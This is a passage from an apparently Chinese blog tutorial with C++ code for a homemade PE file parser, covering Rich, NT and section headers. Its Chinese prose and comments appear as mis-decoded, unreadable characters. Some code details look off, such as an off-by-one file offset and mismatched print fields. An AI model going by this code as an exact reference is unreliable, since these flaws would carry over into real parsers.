class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">__RICH_HEADER</span> {<br>RICH_HEADER_DATA   raw_data;<br>PRICH_HEADER_ENTRY entries;  <span class="hljs-comment">// pointer</span><br><span class="hljs-type">int</span>                entries_num;<br><span class="hljs-type">bool</span>   exits; <span class="hljs-comment">// è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªboolå‹å˜é‡è¡¨ç¤ºæ˜¯å¦å­˜åœ¨è¯¥Header</span><br>}RICH_HEADER, * PRICH_HEADER;<br></code></pre></td></tr></tbody></table></figure><ul><li>å¤„ç†é€»è¾‘ä»£ç ï¼š</li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_dos_stub</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> alloc_size;<br><span class="hljs-type">char</span>* dos_stub_buffer, * buf_ptr;<br><span class="hljs-type">int</span> i, start, end;<br>DWORD xor_key = <span class="hljs-number">0</span>;<br><br><span class="hljs-built_in">memset</span>(&amp;rich_headers, <span class="hljs-number">0</span>, <span class="hljs-built_in">sizeof</span>(RICH_HEADER));<br><br><span class="hljs-comment">// é˜²æ­¢malloc_size_too_bigé—®é¢˜</span><br>alloc_size = nt_headers_offset - <span class="hljs-built_in">sizeof</span>(__IMAGE_DOS_HEADER);<br><span class="hljs-keyword">if</span> (alloc_size + <span class="hljs-number">1</span> &gt; <span class="hljs-number">0xffffff</span>) {<br><span class="hljs-comment">// Really too big! Reject this allocation!</span><br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// è§£æRich headers</span><br>dos_stub_buffer = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(alloc_size + <span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (!dos_stub_buffer) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Dos_stub_buffer malloc failed\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><span class="hljs-built_in">fseek</span>(pe_fp, <span class="hljs-built_in">sizeof</span>(__IMAGE_DOS_HEADER) - <span class="hljs-number">1</span>, SEEK_SET);<br><span class="hljs-built_in">fread</span>(dos_stub_buffer, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), alloc_size, pe_fp);<br>dos_stub_buffer[alloc_size] = <span class="hljs-number">0</span>;<br><br><span class="hljs-comment">// ä»åå¾€å‰å¯»æ‰¾ `Rich` æ ‡å¿—</span><br><span class="hljs-comment">// ç†è®ºä¸Šè¿™é‡Œçš„Rich headersæ˜¯å¯¹é½åˆ°4å­—èŠ‚çš„</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">for (i = alloc_size - 4; i &gt;= 0; i -= 4) {</span><br><span class="hljs-comment">if (*(DWORD*)(dos_stub_buffer + i) == ___IMAGE_RICH_ID) {</span><br><span class="hljs-comment">// æ‰¾åˆ° `Rich`</span><br><span class="hljs-comment">xor_key = *(DWORD*)(dos_stub_buffer + i + 4);</span><br><span class="hljs-comment">fprintf(stdout, "%x\n", xor_key);</span><br><span class="hljs-comment">}</span><br><span class="hljs-comment">}</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-keyword">for</span> (i = alloc_size - <span class="hljs-number">4</span>; i &gt;= <span class="hljs-number">0</span>; i--) {<br><span class="hljs-keyword">if</span> (dos_stub_buffer[i] == <span class="hljs-string">'R'</span> &amp;&amp;<br>dos_stub_buffer[i + <span class="hljs-number">1</span>] == <span class="hljs-string">'i'</span> &amp;&amp;<br>dos_stub_buffer[i + <span class="hljs-number">2</span>] == <span class="hljs-string">'c'</span> &amp;&amp;<br>dos_stub_buffer[i + <span class="hljs-number">3</span>] == <span class="hljs-string">'h'</span>) {<br><span class="hljs-comment">// æ‰¾åˆ° `Rich`</span><br><span class="hljs-keyword">if</span> (i + <span class="hljs-number">8</span> &gt;= (<span class="hljs-type">int</span>)alloc_size) {<br><span class="hljs-comment">// å¤„ç†æ½œåœ¨çš„è¶Šç•Œè¯»é—®é¢˜</span><br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Detect out bound read. Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>xor_key = *(DWORD*)(dos_stub_buffer + i + <span class="hljs-number">4</span>);<br><span class="hljs-keyword">break</span>;<br>}<br>}<br><span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span>) {<br><span class="hljs-comment">// è¯¥PEæ–‡ä»¶å¯èƒ½ç»è¿‡ä¿®æ”¹è°ƒæ•´ï¼ŒRich headerså¯èƒ½è¢«åˆ é™¤äº†</span><br><span class="hljs-comment">// ä¹Ÿæœ‰å¯èƒ½è¯¥PEæ–‡ä»¶æ ¼å¼æœ‰è¯¯</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"Warning: Cannot find Rich headers. (Ignore)\n"</span>);<br>rich_headers.exits = <span class="hljs-literal">false</span>;<br><span class="hljs-keyword">return</span>;<br>}<br><br>end = i + <span class="hljs-number">8</span>;<br><br><span class="hljs-comment">// å¯»æ‰¾èµ·å§‹ç‚¹</span><br><span class="hljs-keyword">for</span> (i = end - <span class="hljs-number">8</span>; i &gt;= <span class="hljs-number">0</span>; i -= <span class="hljs-number">4</span>) {<br>DWORD* temp = (DWORD*)&amp;dos_stub_buffer[i];<br><span class="hljs-keyword">if</span> ((*temp ^ xor_key) == ___IMAGE_RICH_DANS_ID)<br><span class="hljs-keyword">break</span>;<br>}<br><span class="hljs-keyword">if</span> (i &lt; <span class="hljs-number">0</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>start = i;<br><br>alloc_size = end - start;<br>rich_headers.raw_data.data_ptr = (<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(alloc_size);<br><span class="hljs-keyword">if</span> (!rich_headers.raw_data.data_ptr) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Data_ptr malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br>rich_headers.raw_data.data_size = alloc_size;<br><span class="hljs-built_in">memcpy</span>(rich_headers.raw_data.data_ptr, dos_stub_buffer + start, alloc_size);<br><span class="hljs-built_in">free</span>(dos_stub_buffer);<br><br><span class="hljs-comment">// åˆ é™¤é¦–éƒ¨"DanS + 3padding"å’Œå°¾éƒ¨"Rich + XOR key"</span><br><span class="hljs-keyword">if</span>((alloc_size - <span class="hljs-number">24</span>) % <span class="hljs-number">8</span> == <span class="hljs-number">0</span> &amp;&amp; (alloc_size - <span class="hljs-number">24</span>) / <span class="hljs-number">8</span> &lt;= <span class="hljs-number">0xffff</span>)  <span class="hljs-comment">// é™åˆ¶ä¸€ä¸‹æœ€å¤§rich headeræ•°</span><br>rich_headers.entries_num = (alloc_size - <span class="hljs-number">24</span>) / <span class="hljs-number">8</span>;<br><span class="hljs-keyword">else</span> {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// è§£æå¤´éƒ¨å®ä½“</span><br>rich_headers.entries = (PRICH_HEADER_ENTRY)<span class="hljs-built_in">malloc</span>(<span class="hljs-built_in">sizeof</span>(RICH_HEADER_ENTRY) * rich_headers.entries_num);<br><span class="hljs-keyword">if</span> (!rich_headers.entries) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Rich_headers.entries malloc failed!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>buf_ptr = rich_headers.raw_data.data_ptr + <span class="hljs-number">16</span>;<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; rich_headers.entries_num; i++) {<br><br>DWORD* temp = (DWORD*)buf_ptr;<br>rich_headers.entries[i].r_prod_id = (*temp &gt;&gt; <span class="hljs-number">16</span>) ^ (xor_key &gt;&gt; <span class="hljs-number">16</span>);<br>rich_headers.entries[i].r_build_id = (*temp &amp; <span class="hljs-number">0x0000ffff</span>) ^ (xor_key &amp; <span class="hljs-number">0x0000ffff</span>);<br>temp++;<br>rich_headers.entries[i].r_count = *temp ^ xor_key;<br>buf_ptr += <span class="hljs-number">8</span>;<br><br>}<br><br>    rich_headers.exits = <span class="hljs-literal">true</span>;<br>    <br><span class="hljs-comment">// é…Œæƒ…åˆ é™¤raw_dataç¼“å­˜çš„rich_headersåŸå§‹æ•°æ®</span><br><span class="hljs-built_in">free</span>(rich_headers.raw_data.data_ptr);<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_dos_stub_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-comment">// æ‰“å°Rich headersçš„ä¿¡æ¯</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"=====Rich Headers=====\n\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"%-25s\tBuildID\t\tCount\t\tMeaning\n"</span>, <span class="hljs-string">"ProductName"</span>);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; rich_headers.entries_num; i++) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"%-25s\t%d\t\t%d\t\t%d.%d.%d\n"</span>,<br>prod_ids_to_names[rich_headers.entries[i].r_prod_id],<br>rich_headers.entries[i].r_prod_id,<br>rich_headers.entries[i].r_count,<br>rich_headers.entries[i].r_build_id,<br>rich_headers.entries[i].r_prod_id,<br>rich_headers.entries[i].r_count<br>);<br>}<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END==========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>è¿è¡Œç»“æœï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/7.png"></p><hr><h3 id="Step-2-3-è§£æNT-Headers"><a href="#Step-2-3-è§£æNT-Headers" class="headerlink" title="Step 2.3: è§£æNT Headers"></a>Step 2.3: è§£æNT Headers</h3><ul><li><p><code>NT Headers</code>åŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼Œåˆ†åˆ«æ˜¯ <code>PE Signature</code> ã€<code>File Header</code> å’Œ <code>Optional Header</code></p><ul><li><code>PE Signature</code>ï¼šæ²¡æœ‰å•¥ç©æ„ï¼Œå°±æ˜¯å››ä¸ªå­—èŠ‚0x4550ï¼ˆPE..ï¼‰ï¼Œç”¨æ¥è¡¨ç¤ºPEå¤´</li><li><code>File Header</code>ï¼šè®°å½•æ–‡ä»¶çš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚è®¡ç®—æœºä½“ç³»ç»“æ„ç±»å‹ã€èŠ‚åŒºæ•°é‡ã€æ—¶é—´æˆ³ã€<code>Optional Header</code>å¤§å°ã€PEæ–‡ä»¶å±æ€§ç­‰ç­‰</li><li><code>Optional Header</code>ï¼šå¯é€‰å¤´ï¼ŒåŒ…å«ä¸€äº›ç¨‹åºæ‰§è¡Œçš„é‡è¦ä¿¡æ¯ï¼Œå¦‚ç¨‹åºæ‰§è¡Œå…¥å£åœ°å€ã€ç¨‹åºé¦–é€‰è£…è½½åœ°å€ã€å†…å­˜ä¸­èŠ‚åŒºå¯¹é½å¤§å°ã€æ–‡ä»¶ä¸­èŠ‚åŒºå¯¹é½å¤§å°ã€é•œåƒå¤§å°ã€PEå¤´å¤§å°ç­‰ç­‰</li></ul></li><li><p>è§£ææµç¨‹ï¼š</p><ul><li>æŒ‰ç…§ç›¸å…³ç»“æ„ä½“çš„ä¿¡æ¯ä¾æ¬¡è§£æå³å¯</li></ul></li><li><p>å¤„ç†é€»è¾‘ä»£ç ï¼š</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_nt_headers</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br><br><span class="hljs-built_in">fseek</span>(pe_fp, nt_headers_offset, SEEK_SET);<br>read_size = <span class="hljs-built_in">fread</span>(&amp;pe_nt_headers_32, <span class="hljs-built_in">sizeof</span>(___IMAGE_NT_HEADERS32), <span class="hljs-number">1</span>, pe_fp);<br><br><span class="hljs-keyword">if</span> (read_size != <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br>nt_sections_cnt = pe_nt_headers_32.FileHeader.NumberOfSections;<br>nt_optional_header_size = pe_nt_headers_32.FileHeader.SizeOfOptionalHeader;<br>nt_characteristics = pe_nt_headers_32.FileHeader.Characteristics;<br>nt_optional_headers = &amp;pe_nt_headers_32.OptionalHeader;<br>pe_header_size = nt_optional_headers-&gt;SizeOfHeaders;<br>import_dir_table_rva = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;<br>import_dir_table_size = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_IMPORT].Size;<br>export_dir_table_rva = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;<br>export_dir_table_size = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_EXPORT].Size;<br>basereloc_dir_table_rva = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;<br>basereloc_dir_table_size = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;<br>resource_dir_table_rva = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_RESOURCE].VirtualAddress;<br>resource_dir_table_size = nt_optional_headers-&gt;DataDirectory[___IMAGE_DIRECTORY_ENTRY_RESOURCE].Size;<br><br>}<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::print_nt_headers_info</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br>WORD temp_c, n, i;<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"======NT Headers======\n\n"</span>);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"PE Signature: 0x%X\n\n"</span>, pe_nt_headers_32.Signature);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"File Header:\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Machine: %s (0x%04X)\n"</span>, <br><span class="hljs-built_in">translate_machine</span>(pe_nt_headers_32.FileHeader.Machine),<br>pe_nt_headers_32.FileHeader.Machine);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Sections Count: %d\n"</span>, nt_sections_cnt);<br><span class="hljs-comment">// fprintf(stdout, " - Time Date Stamp: %d\n", pe_nt_headers_32.FileHeader.TimeDateStamp);</span><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Optional Header: %d\n"</span>, nt_optional_header_size);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Characteristics: 0x%X\n"</span>, nt_characteristics);<br><span class="hljs-comment">// è¿›ä¸€æ­¥è§£æCharacteritics</span><br>temp_c = nt_characteristics;<br>n = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (temp_c) {<br><span class="hljs-keyword">if</span> (temp_c &amp; <span class="hljs-number">1</span>) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - 0x%X:\t %s\n"</span>, (<span class="hljs-number">1</span> &lt;&lt; n), characteristics_names[n]);<br>}<br>temp_c = temp_c &gt;&gt; <span class="hljs-number">1</span>;<br>n++;<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\nOptional Header:\n"</span>);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Magic: %s (0x%X)\n"</span>, <span class="hljs-built_in">translate_nt_optional_header_magic</span>(nt_optional_headers-&gt;Magic), nt_optional_headers-&gt;Magic);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Code: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfCode, nt_optional_headers-&gt;SizeOfCode);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Initialized Data: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfInitializedData, nt_optional_headers-&gt;SizeOfInitializedData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Uninitialized Data: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfUninitializedData, nt_optional_headers-&gt;SizeOfUninitializedData);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Entry Point: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;AddressOfEntryPoint, nt_optional_headers-&gt;AddressOfEntryPoint);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Base of Code: 0x%X\n"</span>, nt_optional_headers-&gt;BaseOfCode);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Desired Image Base: 0x%X\n"</span>, nt_optional_headers-&gt;ImageBase);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Section Alignment: 0x%X\n"</span>, nt_optional_headers-&gt;SectionAlignment);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - File Alignment: 0x%X\n"</span>, nt_optional_headers-&gt;FileAlignment);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Image: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfImage, nt_optional_headers-&gt;SizeOfImage);<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Size of Headers: 0x%X (%d)\n"</span>, nt_optional_headers-&gt;SizeOfHeaders, nt_optional_headers-&gt;SizeOfHeaders);<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">" - Data Directory:\n"</span>);<br><span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; ___IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR; i++) {<br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"    - %s ==&gt; Address: 0x%X, Size: 0x%X\n"</span>, <span class="hljs-built_in">translate_data_directory</span>(i), nt_optional_headers-&gt;DataDirectory[i].VirtualAddress, nt_optional_headers-&gt;DataDirectory[i].Size);<br>}<br><br><span class="hljs-built_in">fprintf</span>(stdout, <span class="hljs-string">"\n==========END=========\n\n"</span>);<br><br>}<br></code></pre></td></tr></tbody></table></figure><ul><li>è¿è¡Œç»“æœï¼š</li></ul><p><img src="/2023/08/03/%E4%B8%80%E6%AD%A5%E4%B8%80%E6%AD%A5%E6%89%8B%E6%90%93%E4%B8%80%E4%B8%AA%E7%AE%80%E5%8D%95%E7%9A%84PE%E8%A7%A3%E6%9E%90%E5%99%A8/8.png"></p><hr><h3 id="Step-2-4-è§£æSection-Headers"><a href="#Step-2-4-è§£æSection-Headers" class="headerlink" title="Step 2.4: è§£æSection Headers"></a>Step 2.4: è§£æSection Headers</h3><ul><li><p><code>Section Headers</code>ï¼šå­˜å‚¨ç€ä¸èŠ‚åŒºç›¸å…³çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬èŠ‚åŒºåã€<code>VirtualAddress</code>ã€<code>VirtualSize</code>ã€<code>PointerToRawData</code>ã€<code>SizeOfRawData</code>ã€<code>Characteristics</code>ç­‰</p><ul><li><code>VirtualAddress</code>ï¼šè¯¥èŠ‚åŒºè½½å…¥å†…å­˜ä¸­çš„åç§»åœ°å€[11]ï¼›</li><li><code>VirtualSize</code>ï¼šè¯¥èŠ‚åŒºåœ¨å†…å­˜ä¸­çš„å¤§å°ï¼ˆå†…å­˜å¯¹é½ä¹‹å‰çš„é•¿åº¦ï¼šçœŸå®é•¿åº¦ï¼‰[11]ï¼›</li><li><code>PointerToRawData</code>ï¼šè¯¥èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­çš„åç§»åœ°å€[11]ï¼›</li><li><code>SizeOfRawData</code>ï¼šè¯¥èŠ‚åŒºåœ¨æ–‡ä»¶ä¸­çš„å¤§å°ï¼ˆæ–‡ä»¶å¯¹é½ä¹‹å‰çš„é•¿åº¦ï¼šçœŸå®é•¿åº¦ï¼‰[11]ï¼›</li><li><code>Characteristics</code>ï¼šç”¨æ¥è¡¨å¾è¯¥èŠ‚åŒºçš„ä¸€äº›å±æ€§ï¼Œå…·ä½“å€¼è¯¦è§<a href="https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#section-flags">PE Format - Win32 apps | Microsoft Learn</a></li></ul></li><li><p>è§£ææµç¨‹ï¼š</p><ul><li><code>Section Headers</code>åœ¨<code>NT Headers</code>ä¹‹åï¼Œè€Œ<code>NT Headers</code>çš„å€¼æ˜¯å›ºå®šçš„ï¼Œå¯ä»¥é€šè¿‡<code>nt_headers_offset</code>åç§»åœ°å€åŠ ä¸Š<code>NT Headers</code>çš„é•¿åº¦æ‰¾åˆ°<code>Section Headers</code>åœ¨æ–‡ä»¶ä¸­çš„åç§»åœ°å€ï¼›</li><li><code>Section Headers</code>ä¸­sectionæ•°é‡ç”±<code>NT Headers - FileHeader</code>ä¸­çš„<code>NumberOfSections</code>å­—æ®µå†³å®šï¼Œå› æ­¤å¯ä»¥é€šè¿‡è¯¥å­—æ®µç¡®å®šSectionçš„æ•°é‡ï¼›</li><li>æŒ‰ç…§<code>___IMAGE_SECTION_HEADER</code>ç»“æ„ä½“ä¾æ¬¡è§£æ<code>NumberOfSections</code>ä¸ªSectionå³å¯</li></ul></li><li><p>å¤„ç†é€»è¾‘ä»£ç ï¼š</p></li></ul><figure class="highlight cpp"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">PE32::parse_section_headers</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>{<br><span class="hljs-type">size_t</span> read_size;<br><br><span class="hljs-comment">// æ£€æŸ¥ä¸€ä¸‹è¾¹ç•Œ</span><br><span class="hljs-type">int</span> start_pos = nt_headers_offset + <span class="hljs-built_in">sizeof</span>(___IMAGE_NT_HEADERS32);<br><span class="hljs-keyword">if</span> (start_pos + nt_sections_cnt * <span class="hljs-built_in">sizeof</span>(___IMAGE_SECTION_HEADER) &gt; pe_header_size) {<br><span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">"Error: Out of PE header's size. Bad PE file!\n"</span>);<br><span class="hljs-built_in">exit</span>(<span class="hljs-number">-1</span>);<br>}<br><br><span class="hljs-comment">// 